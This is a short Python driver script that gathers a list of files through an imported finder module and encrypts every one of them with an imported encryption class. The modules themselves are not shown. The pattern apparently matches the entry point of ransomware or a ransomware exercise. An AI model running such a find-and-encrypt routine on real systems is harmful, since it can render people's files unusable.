from encrypt_file import EncryptFile
from files_finder import getFiles

files = getFiles()
encrypt = EncryptFile()
print("files to encrypt: " + str(files))
encrypt.encrypt(files)
